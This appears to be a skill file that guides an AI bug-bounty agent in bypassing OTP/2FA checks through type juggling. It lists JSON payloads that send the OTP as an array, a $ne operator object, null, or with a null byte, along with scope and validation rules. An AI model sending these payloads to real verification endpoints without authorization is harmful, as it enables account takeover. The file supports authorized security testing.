# SKILL: OTP / 2FA Bypass via Type Juggling (array / null / object)

**Skill id:** `tip/otp-2fa-bypass-via-type-juggling-array-null-object`  
**Category:** Auth Bypass, API Hacking  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/41ddac31e880813585d2ec9aa20b47bb  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Auth Bypass, API Hacking**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

Endpoints like POST /verify-otp often compare OTP as a string. If the server accepts JSON and does loose comparison or fails open on wrong types, sending the OTP as an array, object, null, or with a null byte can bypass the check. Classic type juggling / fail-open validation. Use only on authorized targets with your own test accounts.

## Payload / Code

```
\{"otp":"1234"\}  → baseline
\{"otp":\["1234"\]\}  → array
\{"otp":\{"\$ne":null\}\}  → operator-style
\{"otp":null\}  → null
"1234%00"  → null byte
Also try omitting the field or sending empty string.
```

## Source

Twitter/X @yogsec — Bug Bounty Tip OTP Bypass via Null Byte / Array Injection (Nov 2026)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
